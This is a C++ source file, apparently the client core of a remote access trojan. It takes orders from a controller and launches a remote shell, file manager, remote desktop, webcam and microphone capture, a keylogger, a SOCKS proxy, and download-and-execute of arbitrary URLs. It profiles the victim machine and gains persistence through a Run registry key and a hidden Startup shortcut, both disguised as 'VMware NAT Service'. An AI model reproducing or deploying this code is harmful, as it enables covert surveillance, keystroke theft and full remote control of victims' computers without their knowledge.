#define STRSAFE_NO_DEPRECATE

#include "Kernel.h"
#include <time.h>
#include <dshow.h>
#include <WinInet.h>
#include <STDIO.H>
#include <process.h>
#include "ModuleMgr.h"
#include "utils.h"
#include   <shlobj.h>
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "Strmiids.lib") 

#define SERVICE_NAME TEXT("VMware NAT Service")

CKernel::CKernel(CIOCPClient*pClient) :
CMsgHandler(pClient, KNEL)

{
	m_pModuleMgr = new CModuleMgr(this);
	m_module_size = 0;
	m_loaded_size = 0;
	m_checksum = 0;
	m_module_buffer = nullptr;
}


CKernel::~CKernel()
{
	if (m_pModuleMgr){
		delete m_pModuleMgr;
		m_pModuleMgr = NULL;
	}
}

/***********************************************************************/
void CKernel::OnOpen()
{

}

void CKernel::OnClose()
{
	// close waiting mgr.
	if (WAIT_TIMEOUT == WaitForSingleObject(m_pModuleMgr->m_hFree, 0)){
		//如果现在还有正在传输的模块....
		SetEvent(m_pModuleMgr->m_hModuleTrans);
		m_pModuleMgr->m_current_module_name = "";
	}
	SetEvent(m_pModuleMgr->m_hFree);
	//
}

void CKernel::OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer)
{
	switch (Msg)
	{
	case KNEL_READY:
		OnReady();				//Send Login infomation;
		break;
	case KNEL_POWER_REBOOT:
		OnPower_Reboot();
		break;
	case KNEL_POWER_SHUTDOWN:
		OnPower_Shutdown();
		break;
	case KNEL_EDITCOMMENT:
		OnEditComment((TCHAR*)Buffer);
		break;
	case KNEL_CMD:
		OnCmd();
		break;
	case KNEL_CHAT:
		OnChat();
		break;
	case KNEL_FILEMGR:
		OnFileMgr();
		break;
	case KNEL_DESKTOP:
		OnRemoteDesktop();
		break;
	case KNEL_CAMERA:
		OnCamera();
		break;
	case KNEL_RESTART:
		OnRestart();
		break;
	case KNEL_MICROPHONE:
		OnMicrophone();
		break;
	case KNEL_DOWNANDEXEC:
		OnDownloadAndExec((TCHAR*)Buffer);
		break;
	case KNEL_EXIT:
		OnExit();
		break;
	case KNEL_KEYBD_LOG:
		OnKeyboard();
		break;
	case KNEL_PROXY_SOCKSPROXY:
		OnSocksProxy();
		break;
	//模块传输......
	case KNEL_MODULE_INFO:
		OnModuleInfo(Buffer);
		break;
	case KNEL_MODULE_CHUNK_DAT:
		OnRecvModuleChunk(Buffer);
		break;
	//
	case KNEL_UTILS_COPYTOSTARTUP:
		OnUnilsCopyToStartupMenu();
		break;
	case KNEL_UTILS_WRITE_REG:
		OnUtilsWriteStartupReg();
		break;
	}
}


void CKernel::GetModule(const char* ModuleName){
	//释放资源....
	m_current_module = ModuleName;
	m_loaded_size = 0;
	m_module_size = 0;
	m_checksum = 0;

	if (m_module_buffer){
		delete[] m_module_buffer;
		m_module_buffer = nullptr;
	}
	//
	SendMsg(KNEL_GETMODULE_INFO, (char*)ModuleName, lstrlenA(ModuleName) + 1);
}

void CKernel::OnRecvModuleChunk(char* Chunk){
	DWORD *chunkInfo = (DWORD*)Chunk;

	DWORD moduleSize = chunkInfo[0];
	DWORD chunkSize = chunkInfo[1];
	DWORD checksum = chunkInfo[2];
		
	unsigned char * chunkData = (unsigned char*)Chunk + sizeof(DWORD) * 3;
	
	for (size_t i = 0; i < chunkSize; i++){
		checksum -= chunkData[i];
	}

	if (moduleSize != m_module_size || checksum){
		//invalid module.....
		m_pModuleMgr->LoadModule(nullptr, 0);
		return;
	}

	//Save Module Chunk Data.....
	memcpy(m_module_buffer + m_loaded_size, chunkData, chunkSize);
	m_loaded_size += chunkSize;
	//continue get module chunk...
	GetModuleChunk();
}

void CKernel::OnModuleInfo(char* info){
	DWORD  size = ((DWORD*)info)[0];
	DWORD  checksum = ((DWORD*)info)[1];
	char * name = info + sizeof(DWORD) * 2;
	
	if (m_current_module != name){
		m_pModuleMgr->LoadModule(nullptr, 0);
		return;
	}

	m_module_size = size;
	m_checksum = checksum;
	m_module_buffer = new char[m_module_size];
	//
	GetModuleChunk();
}

#define MAX_CHUNK_SIZE 0x10000

void CKernel::GetModuleChunk(){
	//
	if (m_module_size == m_loaded_size){
		m_pModuleMgr->LoadModule(m_module_buffer, m_module_size);
		return;
	}

	// Get Chunk Data:

	// Total Size,checksum, offset,chunk size,
	size_t size = sizeof(DWORD) * 4 + lstrlenA(m_current_module.c_str()) + 1;
	char * lpBuffer = (char*)calloc(1, size);
	DWORD* Packet = (DWORD*)lpBuffer;
	char * name = lpBuffer + sizeof(DWORD) * 4;

	DWORD LeftSize = m_module_size - m_loaded_size;
	Packet[0] = m_module_size;
	Packet[1] = m_checksum;
	Packet[2] = m_loaded_size;
	Packet[3] = LeftSize < MAX_CHUNK_SIZE ? LeftSize : MAX_CHUNK_SIZE;
	
	lstrcpyA(name, m_current_module.c_str());

	//获取下一个数据块..
	SendMsg(KNEL_MODULE_CHUNK_GET, lpBuffer, size);
	free(lpBuffer);
}
/*******************************************************************************
			Get Ping
			********************************************************************************/
/*
	TTL: time to live,最长生存时间,每经过一个节点,TTL-1,到0的时候丢弃.;
	*/
/*
ping 请求:type 8,code 0;
ping 相应:type 0,code 0;
*/
//struct ip
//{
//	unsigned int hl : 4;		//header lenght;
//	unsigned int ver : 4;		//version;
//
//};

/*
检验和算法.;
两个字节为一个单位相加.;
若剩余一个字节,把最后一个字节加起来.;

若checksum 除去低16位之后不为0.右移16并且与低16位相加.;

返回~checksum;
*/

UINT16 CKernel::icmp_checksum(char*buff, int len)
{
	UINT64 checksum = 0;
	UINT64 Hi = 0;
	if (len & 1)
		checksum += buff[len - 1];
	len--;
	for (int i = 0; i < len; i += 2){
		checksum += *(UINT16*)&buff[i];	//取两个字节相加.;
	}
	while ((Hi = (checksum >> 16))){
		checksum = Hi + checksum & 0xFFFF;
	}
	return ~(USHORT)(checksum & 0xFFFF);
}
DWORD CKernel::GetPing(const char*host)
{
	struct MyIcmp{
		UINT8 m_type;
		UINT8 m_code;
		UINT16 m_checksum;			//校验和算法;
		UINT16 m_id;				//唯一标识;
		UINT16 m_seq;				//序列号;
		LARGE_INTEGER  m_TickCount;		//
	};

	DWORD interval = -1;
	USHORT id = LOWORD(GetProcessId(NULL));
	double TickCountSum = 0;
	DWORD SuccessCount = 0;
	LARGE_INTEGER frequency;

	//
	MyIcmp icmp_data = { 0 };
	char RecvBuf[128] = { 0 };
	sockaddr_in dest = { 0 };
	int i = 0;
	HOSTENT *p = NULL;
	QueryPerformanceFrequency(&frequency);

	SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
	if (s == INVALID_SOCKET){
		return interval;
	}
	//set recv time out;
	DWORD timeout = 3000;
	setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

	//获取目标主机IP;

	p = gethostbyname(host);
	if (!p)
		goto Return;

	memcpy(&dest.sin_addr, p->h_addr_list[0], 4);
	dest.sin_family = AF_INET;

	//设置icmp头;
	icmp_data.m_type = 8;
	icmp_data.m_code = 0;
	icmp_data.m_id = id;//唯一标识;

	for (i = 1; i <= 4; i++){
		icmp_data.m_seq = i;	//序列;
		icmp_data.m_checksum = 0;

		QueryPerformanceCounter(&icmp_data.m_TickCount);
		icmp_data.m_checksum = icmp_checksum((char*)&icmp_data, sizeof(icmp_data));
		//
		if (INVALID_SOCKET == sendto(s, (char*)&icmp_data, sizeof(icmp_data),
			0, (sockaddr*)&dest, sizeof(dest))){
			goto Return;
		}
		int namelen = sizeof(dest);
		int nRecv = recvfrom(s, RecvBuf, 128, 0, (sockaddr*)&dest, &namelen);
		if (INVALID_SOCKET == nRecv && WSAETIMEDOUT != WSAGetLastError()){
			goto Return;
		}
		//接受到了.IP头的第一个字节,低四位是HeaderLen,高四位是版本.;
		if ((RecvBuf[0] & 0xf0) == 0x40){
			//ipv4:
			DWORD IPHeaderLength = (RecvBuf[0] & 0x0f) * 4;
			char*RecvIcmpData = RecvBuf + IPHeaderLength;
			if (((MyIcmp*)RecvIcmpData)->m_id == id && ((MyIcmp*)RecvIcmpData)->m_seq == i){
				//计算间隔.GetTickCount精度有点低,将就一下。;
				LARGE_INTEGER cur_counter;

				QueryPerformanceCounter(&cur_counter);

				TickCountSum += ((double)cur_counter.QuadPart -
					((MyIcmp*)RecvIcmpData)->m_TickCount.QuadPart) / frequency.QuadPart * 1000;	//计算ms.
				SuccessCount++;
				interval = TickCountSum / SuccessCount + 1;
			}
		}
	}
Return:
	closesocket(s);
	return interval;
}

/*******************************************************************************
				GetPrivateIP
				********************************************************************************/
void CKernel::GetPrivateIP(TCHAR PrivateIP[128])
{
	PrivateIP[0] = L'-';
	PrivateIP[1] = 0;

	auto const  peer = GetSockName();
	for (int i = 0;; i++){
		PrivateIP[i] = peer.first[i];
		if (!PrivateIP[i])
			break;
	}
}

/*******************************************************************************
				GetCPU
				********************************************************************************/
void CKernel::GetPCName(TCHAR PCName[128])
{
	DWORD BufferSize = 128;
	GetComputerNameW(PCName, &BufferSize);
}
void CKernel::GetCurrentUser(TCHAR User[128])
{
	DWORD BufferSize = 128;
	GetUserNameW(User, &BufferSize);
}

void CKernel::GetRAM(TCHAR RAMSize[128])
{
	MEMORYSTATUSEX MemoryStatu = { sizeof(MEMORYSTATUSEX) };
	LARGE_INTEGER liRAMSize = { 0 };
	if (GlobalMemoryStatusEx(&MemoryStatu)){
		liRAMSize.QuadPart = MemoryStatu.ullTotalPhys;
	}
	GetStorageSizeString(liRAMSize, RAMSize);
}

void CKernel::GetDisk(TCHAR szDiskSize[128])
{
	LARGE_INTEGER liDiskSize = { 0 };
	DWORD Drivers = GetLogicalDrives();
	TCHAR Name[] = TEXT("A:\\");
	while (Drivers){
		if (Drivers & 0x1){
			DWORD Type = GetDriveTypeW(Name);
			if (DRIVE_FIXED == Type){
				ULARGE_INTEGER TotalAvailableBytes;
				ULARGE_INTEGER TotalBytes;
				ULARGE_INTEGER TotalFreeBytes;
				GetDiskFreeSpaceExW(Name, &TotalAvailableBytes, &TotalBytes, &TotalFreeBytes);
				liDiskSize.QuadPart += TotalBytes.QuadPart;
			}
		}
		Name[0]++;
		Drivers >>= 1;
	}
	GetStorageSizeString(liDiskSize, szDiskSize);
}

void CKernel::GetOSName(TCHAR OsName[128])
{
	HKEY hKey = 0;
	DWORD dwType = REG_SZ;
	DWORD dwSize = 255;
	TCHAR data[MAX_PATH] = { 0 };
	OsName[0] = 0;

	if (!RegOpenKeyW(HKEY_LOCAL_MACHINE,
		TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), &hKey)){
		if (!RegQueryValueExW(hKey, TEXT("ProductName"), NULL, &dwType, (LPBYTE)data, &dwSize)){
			lstrcpy(OsName, data);
		}
		RegCloseKey(hKey);
	}
	DWORD bit = 32;
	SYSTEM_INFO si = { sizeof(si) };
	//GetSystemInfo获取子系统版本.

	typedef VOID(__stdcall *PGetNativeSystemInfo)(
		LPSYSTEM_INFO lpSystemInfo
		);

	HMODULE hKernel32 = GetModuleHandleW(TEXT("Kernel32"));
	if (hKernel32){
		PGetNativeSystemInfo GetNativeSystemInfo =
			(PGetNativeSystemInfo)GetProcAddress(hKernel32, "GetNativeSystemInfo");
		if (GetNativeSystemInfo){
			//printf("GetNativeSystemInfo: %x\n",GetNativeSystemInfo);
			GetNativeSystemInfo(&si);
			if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
				si.wProcessorArchitecture == PROCESSOR_AMD_X8664 ||
				si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64){
				bit = 64;
			}
			//printf("GetNativeSystemInfo OK !\n");
			TCHAR Bit[16] = { 0 };
			wsprintf(Bit, TEXT(" %d Bit"), bit);
			lstrcat(OsName, Bit);
		}
	}
}


void CKernel::GetCPU(TCHAR CPU[128])
{
	//0x80000002-->0x80000004
	char szName[64] = { 0 };
	__asm
	{
		xor esi, esi
		mov edi, 0x80000002
		getinfo:
		mov eax, edi
		add eax, esi
		cpuid
		shl esi, 4
		mov dword ptr[szName + esi + 0], eax
		mov dword ptr[szName + esi + 4], ebx
		mov dword ptr[szName + esi + 8], ecx
		mov dword ptr[szName + esi + 12], edx
		shr esi, 4
		inc esi
		cmp esi, 3
		jb getinfo

		mov ecx, 0
		mov edi, [CPU]
	copyinfo:
		mov al, byte ptr[szName + ecx]
		mov byte ptr[edi + ecx * 2], al
		inc ecx
		test al, al
		jne copyinfo
	}

	SYSTEM_INFO si = { 0 };
	HKEY hKey = NULL;
	DWORD dwMHZ = 0;
	DWORD Type = REG_DWORD;
	DWORD cbBuffer = sizeof(dwMHZ);
	TCHAR subKey[] = TEXT("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
	
	
	if (ERROR_SUCCESS != RegCreateKeyW(HKEY_LOCAL_MACHINE,
		subKey, &hKey)){
		return;
	}

	if (ERROR_SUCCESS == RegQueryValueExW(hKey, TEXT("~MHz"),
		0, &Type, (LPBYTE)&dwMHZ, &cbBuffer)){
		GetSystemInfo(&si);
		_t_sprintf(CPU, TEXT("%d MHz * %d"), dwMHZ, si.dwNumberOfProcessors);
	}
	RegCloseKey(hKey);
}

DWORD CKernel::HasCamera()
{
	UINT nCam = 0;
	CoInitialize(NULL);    //COM 库初始化;
	/////////////////////    Step1        /////////////////////////////////
	//枚举捕获设备;
	ICreateDevEnum *pCreateDevEnum;                          //创建设备枚举器;
	//创建设备枚举管理器;
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum,    //要创建的Filter的Class ID;
		NULL,                                                //表示Filter不被聚合;
		CLSCTX_INPROC_SERVER,                                //创建进程内COM对象;
		IID_ICreateDevEnum,                                  //获得的接口ID;
		(void**)&pCreateDevEnum);                            //创建的接口对象的指针;
	if (hr != NOERROR)
	{
		//	d(_T("CoCreateInstance Error"));
		return FALSE;
	}
	/////////////////////    Step2        /////////////////////////////////
	IEnumMoniker *pEm;                 //枚举监控器接口;
	//获取视频类的枚举器;
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEm, 0);
	//如果想获取音频类的枚举器，则使用如下代码;
	//hr=pCreateDevEnum->CreateClassEnumerator(CLSID_AudioInputDeviceCategory, &pEm, 0);
	if (hr != NOERROR){
		//d(_T("hr != NOERROR"));
		return FALSE;
	}
	/////////////////////    Step3        /////////////////////////////////
	pEm->Reset();                                            //类型枚举器复位;
	ULONG cFetched;
	IMoniker *pM;                                            //监控器接口指针;
	while (hr = pEm->Next(1, &pM, &cFetched), hr == S_OK)       //获取下一个设备;
	{
		IPropertyBag *pBag;                                  //属性页接口指针;
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		//获取设备属性页;
		if (SUCCEEDED(hr))
		{
			VARIANT var;
			var.vt = VT_BSTR;                                //保存的是二进制数据;
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			//获取FriendlyName形式的信息;
			if (hr == NOERROR){
				nCam++;
				wprintf((WCHAR*)var.pbstrVal);
				SysFreeString(var.bstrVal);   //释放资源，特别要注意;
			}
			pBag->Release();                  //释放属性页接口指针;
		}
		pM->Release();                        
	}
	CoUninitialize();                   //卸载COM库;
	return nCam;
}

void CKernel::GetInstallDate(TCHAR InstallDate[128])
{
	HKEY hKey = NULL;
	//Open Key
	if (ERROR_SUCCESS != RegCreateKeyW(HKEY_CURRENT_USER,
		TEXT("SOFTWARE\\HHClient"), &hKey)){
		lstrcpy(InstallDate, L"-");
		return;
	}
	DWORD cbBuffer = 128 * sizeof(TCHAR);
	DWORD Type = 0;

	if (ERROR_SUCCESS != RegQueryValueExW(hKey,
		TEXT("InstallDate"), 0, &Type, (LPBYTE)InstallDate, &cbBuffer)){
		//Set key value;
		//失败.....
		TCHAR CurDate[64] = { 'U', 'n', 'k', 'n', 'o', 'w', 'n', '\0' };
		time_t CurTime = time(NULL);
		tm*pLocalTime = localtime(&CurTime);

		if (pLocalTime){
			wsprintf(CurDate, TEXT("%d-%d-%d %d:%d:%d"),
				pLocalTime->tm_year + 1900, pLocalTime->tm_mon + 1,
				pLocalTime->tm_mday, pLocalTime->tm_hour, pLocalTime->tm_min,
				pLocalTime->tm_sec);
		}
		//
		if (ERROR_SUCCESS != RegSetValueExW(hKey, TEXT("InstallDate"), 0,
			REG_SZ, (BYTE*)CurDate, sizeof(TCHAR)*(lstrlenW(CurDate) + 1))){
			//设置失败....返回...
			lstrcpy(InstallDate, TEXT("-"));
			RegCloseKey(hKey);
			return;
		}
		//设置成功，返回设置的InstallDate....
		lstrcpy(InstallDate, CurDate);
	}
	RegCloseKey(hKey);
	return;
}

void CKernel::GetComment(TCHAR Comment[256])
{
	lstrcpy(Comment, TEXT("default"));
	HKEY hKey = NULL;
	//Open Key
	if (ERROR_SUCCESS == RegCreateKeyW(HKEY_CURRENT_USER, TEXT("SOFTWARE\\HHClient"), &hKey))
	{
		DWORD cbBuffer = 256 * sizeof(TCHAR);
		DWORD Type = 0;
		if (ERROR_SUCCESS == RegQueryValueExW(hKey, TEXT("Comment"), 
			0, &Type, (LPBYTE)Comment, &cbBuffer)){
			//do nothing.....
		}
		RegCloseKey(hKey);
	}
	return;
}

void CKernel::GetLoginInfo(LoginInfo*pLoginInfo)
{
	memset(pLoginInfo, 0, sizeof(LoginInfo));
	GetPrivateIP(pLoginInfo->PrivateIP);
	GetPCName(pLoginInfo->HostName);
	GetCurrentUser(pLoginInfo->User);
	GetOSName(pLoginInfo->OsName);
	GetInstallDate(pLoginInfo->InstallDate);
	GetCPU(pLoginInfo->CPU);
	GetDisk(pLoginInfo->Disk_RAM);
	lstrcat(pLoginInfo->Disk_RAM, TEXT("/"));
	GetRAM(pLoginInfo->Disk_RAM + lstrlen(pLoginInfo->Disk_RAM));
	//

	auto const  peer = GetPeerName();
	pLoginInfo->dwPing = GetPing(peer.first.c_str());
	pLoginInfo->dwHasCamera = HasCamera();
	GetComment(pLoginInfo->Comment);
}

void CKernel::OnPower_Reboot()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//获取进程标志
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	//获取关机特权的LUID
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//获取这个进程的关机特权
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS)
		return;

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
}
void CKernel::OnPower_Shutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;
	//获取进程标志
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return;

	//获取关机特权的LUID
	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	//获取这个进程的关机特权
	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	if (GetLastError() != ERROR_SUCCESS)
		return;

	ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, 0);
}

void CKernel::OnReady()
{
	LoginInfo li;
	GetLoginInfo(&li);
	SendMsg(KNEL_LOGIN, (char*)&li, sizeof(li));
}

void CKernel::OnEditComment(TCHAR NewComment[256])
{
	HKEY hKey = NULL;
	TCHAR error[0x100];
	//Open Key
	if (ERROR_SUCCESS ==
		RegCreateKey(HKEY_CURRENT_USER, TEXT("SOFTWARE\\HHClient"), &hKey)){
		DWORD dwError = RegSetValueEx(hKey, TEXT("Comment"), 0,
			REG_SZ, (BYTE*)NewComment, sizeof(TCHAR)*(lstrlen(NewComment) + 1));

		if (ERROR_SUCCESS == dwError){
			SendMsg(KNEL_EDITCOMMENT_OK, (char*)NewComment,
				sizeof(TCHAR)*(lstrlen(NewComment) + 1));
		}
		else{
			_t_sprintf(error, TEXT("RegSetValueEx failed with error: %d"), dwError);
			SendMsg(KNEL_ERROR, error, sizeof(TCHAR) * (lstrlen(error) + 1));
		}
		RegCloseKey(hKey);
		return;
	}
	return;
}

void CKernel::OnRestart()
{
	PROCESS_INFORMATION pi;
	STARTUPINFOW si = { sizeof(si) };
	TCHAR szModuleName[0x1000];
	//exec another instance.
	GetModuleFileName(GetModuleHandle(0), szModuleName, 0x1000);
	//
	if (CreateProcess(szModuleName, 0, 0, 0, 0, 0, 0, 0, &si, &pi)){

		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		ExitProcess(0);
	}
}


void CKernel::OnCmd()
{
	auto const  peer = GetPeerName();

	if (!m_pModuleMgr->RunModule("cmd", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}

void CKernel::OnChat()
{
	auto const  peer = GetPeerName();

	if (!m_pModuleMgr->RunModule("chat", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}

void CKernel::OnFileMgr()
{
	auto const  peer = GetPeerName();

	if (!m_pModuleMgr->RunModule("filemgr", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}

void CKernel::OnRemoteDesktop()
{
	auto const  peer = GetPeerName();

	if (!m_pModuleMgr->RunModule("rd", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}

void CKernel::OnMicrophone()
{
	auto const  peer = GetPeerName();

	if (!m_pModuleMgr->RunModule("microphone", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}
void CKernel::OnCamera()
{
	auto const  peer = GetPeerName();

	if (!m_pModuleMgr->RunModule("camera", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * ( lstrlen(szError) + 1));
	}
}


#include "..\FileManager\FileDownloader.h"

void CKernel::OnDownloadAndExec(TCHAR*szUrl)
{
	//download to 
	TCHAR szTempPath[0x100];
	GetTempPath(0x100, szTempPath);
	//Save Path + Url
	CFileDownloader::InitParam*pInitParam = (CFileDownloader::InitParam*)
		calloc(1, sizeof(DWORD) +
		sizeof(TCHAR)* (lstrlenW(szTempPath) + 1 + lstrlenW(szUrl) + 1));

	pInitParam->dwFlags |= FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD;
	lstrcpy(pInitParam->szURL, szTempPath);
	lstrcat(pInitParam->szURL, TEXT("\n"));
	lstrcat(pInitParam->szURL, szUrl);
	//
	auto const  peer = GetPeerName();
	//
	if (!m_pModuleMgr->RunModule("filedownloader", peer.first.c_str(), peer.second,
		(LPVOID)(((DWORD)(pInitParam)) | 0x80000000))){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}



void CKernel::OnExit()
{
	ExitProcess(0);
}

void CKernel::OnKeyboard()
{
	auto const  peer = GetPeerName();
	if (!m_pModuleMgr->RunModule("kblog", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}

void CKernel::OnSocksProxy(){
	auto const  peer = GetPeerName();
	if (!m_pModuleMgr->RunModule("socksproxy", peer.first.c_str(), peer.second, NULL)){
		TCHAR szError[] = TEXT("Kernel is busy...");
		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
	}
}

void CKernel::OnUnilsCopyToStartupMenu(){

	TCHAR StartupPath[MAX_PATH];
	if (!SHGetSpecialFolderPath(NULL, StartupPath, CSIDL_STARTUP, FALSE)){
		TCHAR szError[0x100];
		wsprintf(szError, TEXT("SHGetSpecialFolderPath Failed With Error : %u"), GetLastError());
		SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	lstrcat(StartupPath, TEXT("\\"));
	lstrcat(StartupPath, SERVICE_NAME);
	lstrcat(StartupPath, TEXT(".lnk"));

	HRESULT hres;
	IShellLink * pShellLink;
	hres = ::CoCreateInstance(CLSID_ShellLink, NULL, 
		CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&pShellLink);
	if (!SUCCEEDED(hres)){
		TCHAR szError[0x100];
		wsprintf(szError, TEXT("CoCreateInstance Failed With Error : %u"), GetLastError());
		SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	TCHAR exePath[MAX_PATH];
	TCHAR workDir[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, workDir);
	GetModuleFileName(GetModuleHandle(0), exePath, MAX_PATH);

	pShellLink->SetPath(exePath);
	pShellLink->SetWorkingDirectory(workDir);
	IPersistFile *pPersistFile;
	hres = pShellLink->QueryInterface(IID_IPersistFile, (void **)&pPersistFile);
	if (SUCCEEDED(hres)){
		hres = pPersistFile->Save(StartupPath, TRUE);
		TCHAR szError[0x100];

		if (SUCCEEDED(hres)){	
			wsprintf(szError, TEXT("Copy To Startup Menu Success!"));
			SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
			SetFileAttributes(StartupPath, FILE_ATTRIBUTE_SYSTEM |
				FILE_ATTRIBUTE_HIDDEN);
		}
		else{
			wsprintf(szError, TEXT("Copy To Startup Menu Failed (%d)!"),hres);
			SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		}
		pPersistFile->Release();
	}
	pShellLink->Release();
}

void CKernel::OnUtilsWriteStartupReg(){
	TCHAR exePath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(0), exePath, MAX_PATH);
	HKEY hKey = NULL;
	TCHAR keyPath[] = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	TCHAR szError[0x100];
	//Open Key
	//HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
	if (ERROR_SUCCESS ==
		RegCreateKey(HKEY_CURRENT_USER, keyPath, &hKey)){
		DWORD dwError = RegSetValueEx(hKey, SERVICE_NAME, 0,
			REG_SZ, (BYTE*)exePath, sizeof(TCHAR)*(lstrlen(exePath) + 1));
		if (dwError){
			wsprintf(szError, TEXT("RegSetValueEx Failed With Error: %u"), dwError);
		}
		else{
			wsprintf(szError, TEXT("Write Registry Start Success!"), dwError);
		}
		RegCloseKey(hKey);
	}
	else{
		wsprintf(szError, TEXT("RegCreateKey Failed With Error: %u"), GetLastError());
	}
	SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
}


